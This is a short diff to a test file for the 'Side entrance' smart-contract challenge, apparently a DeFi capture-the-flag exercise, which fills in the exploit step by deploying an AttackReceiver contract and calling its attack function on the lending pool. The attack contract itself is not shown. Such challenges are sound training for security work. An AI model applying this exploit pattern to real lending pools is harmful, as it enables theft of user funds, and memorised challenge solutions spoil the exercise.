@@ -25,6 +25,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackerReceiverFactory = await ethers.getContractFactory("AttackReceiver", attacker);
+        const attackerReceiver = await attackerReceiverFactory.deploy();
+        await attackerReceiver.connect(attacker).attack(this.pool.address);
     });
 
     after(async function () {
